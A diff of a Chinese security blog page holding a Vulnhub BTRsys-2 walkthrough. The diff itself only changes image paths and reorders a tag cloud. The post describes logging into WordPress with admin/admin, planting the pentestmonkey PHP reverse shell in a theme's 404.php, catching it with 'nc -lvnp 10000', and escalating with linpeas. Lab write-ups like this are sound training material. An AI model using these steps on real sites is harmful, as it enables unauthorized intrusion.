@@ -188,7 +188,7 @@ baseball<span aria-hidden="true" class="line-numbers-rows"><span></span><span></
   <div class="row">
 	
 	
-		<h1 id="BTRsys-2"><a href="#BTRsys-2" class="headerlink" title="BTRsys-2"></a>BTRsys-2</h1><h2 id="来源：Vulnhub"><a href="#来源：Vulnhub" class="headerlink" title="来源：Vulnhub"></a>来源：Vulnhub</h2><h3 id="难度：Easy"><a href="#难度：Easy" class="headerlink" title="难度：Easy"></a>难度：Easy</h3><p><img src="/images/OSCPBTR/BTRsys1.JPG"><br>fscan扫描可知开放了ftp和网页端，其中ftp允许匿名登录，但尝试登陆后没有文件，所以先将注意力放在web页面，对其进行目录扫描发现robots.txt，并发现隐藏的&#x2F;wordpress目录，访问发现是wordpress博客，在页面中找到登录地址，使用弱口令admin&#x2F;admin进入后台<br>在后台一番查找，尝试以文件上传等方式getshell均失败，看提示得知可以通过修改博客的主题外观插件来getshell，我们先修改其主题外观插件的404页面<br>使用在线生成shell网站：<a target="_blank" rel="noopener" href="https://shell.nctry.com/">https://shell.nctry.com/</a><br>生成php反弹shell：</p>
+		<h1 id="BTRsys-2"><a href="#BTRsys-2" class="headerlink" title="BTRsys-2"></a>BTRsys-2</h1><h2 id="来源：Vulnhub"><a href="#来源：Vulnhub" class="headerlink" title="来源：Vulnhub"></a>来源：Vulnhub</h2><h3 id="难度：Easy"><a href="#难度：Easy" class="headerlink" title="难度：Easy"></a>难度：Easy</h3><p><img src="/images/OSCPBTRsys/BTRsys1.JPG"><br>fscan扫描可知开放了ftp和网页端，其中ftp允许匿名登录，但尝试登陆后没有文件，所以先将注意力放在web页面，对其进行目录扫描发现robots.txt，并发现隐藏的&#x2F;wordpress目录，访问发现是wordpress博客，在页面中找到登录地址，使用弱口令admin&#x2F;admin进入后台<br>在后台一番查找，尝试以文件上传等方式getshell均失败，看提示得知可以通过修改博客的主题外观插件来getshell，我们先修改其主题外观插件的404页面<br>使用在线生成shell网站：<a target="_blank" rel="noopener" href="https://shell.nctry.com/">https://shell.nctry.com/</a><br>生成php反弹shell：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span>
 <span class="token comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
@@ -305,7 +305,7 @@ baseball<span aria-hidden="true" class="line-numbers-rows"><span></span><span></
 <span class="token punctuation">&#125;</span>
 
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>网站上还有很多其他的反弹shell，实战时可根据自己需求选择，修改404页面结果如下：<br><img src="/images/OSCPBTR/BTRsys2.JPG"><br>我们使用<code>nc -lvnp 10000</code>先开启监听，然后访问一个不存在的页面以触发404页面<br><strong>官方做法：访问插件404页面路径位置 “&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;404.php”</strong><br>即可获得一个反弹shell<br>随后使用两个经典linux提权脚本：<br>1.linux-exploit-suggester<br><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a><br>2.linpeas.sh<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a><br>按照脚本给出的提权建议一个个尝试即可成功提权</p>
+<p>网站上还有很多其他的反弹shell，实战时可根据自己需求选择，修改404页面结果如下：<br><img src="/images/OSCPBTRsys/BTRsys2.JPG"><br>我们使用<code>nc -lvnp 10000</code>先开启监听，然后访问一个不存在的页面以触发404页面<br><strong>官方做法：访问插件404页面路径位置 “&#x2F;wp-content&#x2F;themes&#x2F;twentyfourteen&#x2F;404.php”</strong><br>即可获得一个反弹shell<br>随后使用两个经典linux提权脚本：<br>1.linux-exploit-suggester<br><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a><br>2.linpeas.sh<br><a target="_blank" rel="noopener" href="https://github.com/peass-ng/PEASS-ng/releases">https://github.com/peass-ng/PEASS-ng/releases</a><br>按照脚本给出的提权建议一个个尝试即可成功提权</p>
 
 	
 	</div>
@@ -701,41 +701,41 @@ hexo server <span class="token comment">#启动hexo博客</span><span aria-hidde
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/其他/">其他<span>1</span></a></li>
-		
 			<li><a href="/tags/速查/">速查<span>3</span></a></li>
-		
-			<li><a href="/tags/OSCP/">OSCP<span>2</span></a></li>
-		
-			<li><a href="/tags/Vulnhub/">Vulnhub<span>2</span></a></li>
 		
 			<li><a href="/tags/CTF/">CTF<span>20</span></a></li>
 		
-			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
-		
-			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
-		
-			<li><a href="/tags/Web/">Web<span>10</span></a></li>
-		
-			<li><a href="/tags/奇技淫巧/">奇技淫巧<span>2</span></a></li>
-		
-			<li><a href="/tags/渗透测试/">渗透测试<span>2</span></a></li>
-		
-			<li><a href="/tags/项目/">项目<span>3</span></a></li>
-		
-			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
+			<li><a href="/tags/Classical-Crypto/">Classical Crypto<span>1</span></a></li>
 		
 			<li><a href="/tags/靶场练习/">靶场练习<span>2</span></a></li>
 		
-			<li><a href="/tags/博客/">博客<span>1</span></a></li>
-		
-			<li><a href="/tags/Classical-Crypto/">Classical Crypto<span>1</span></a></li>
-		
 			<li><a href="/tags/SRC挖掘/">SRC挖掘<span>1</span></a></li>
+		
+			<li><a href="/tags/渗透测试/">渗透测试<span>2</span></a></li>
+		
+			<li><a href="/tags/OSCP/">OSCP<span>2</span></a></li>
+		
+			<li><a href="/tags/Reverse/">Reverse<span>1</span></a></li>
+		
+			<li><a href="/tags/其他/">其他<span>1</span></a></li>
 		
 			<li><a href="/tags/PWN/">PWN<span>4</span></a></li>
 		
+			<li><a href="/tags/Web/">Web<span>10</span></a></li>
+		
+			<li><a href="/tags/Misc/">Misc<span>5</span></a></li>
+		
+			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
+		
+			<li><a href="/tags/奇技淫巧/">奇技淫巧<span>2</span></a></li>
+		
+			<li><a href="/tags/Vulnhub/">Vulnhub<span>2</span></a></li>
+		
+			<li><a href="/tags/项目/">项目<span>3</span></a></li>
+		
 			<li><a href="/tags/笔记/">笔记<span>1</span></a></li>
+		
+			<li><a href="/tags/博客/">博客<span>1</span></a></li>
 		
 		 
 		</ul>
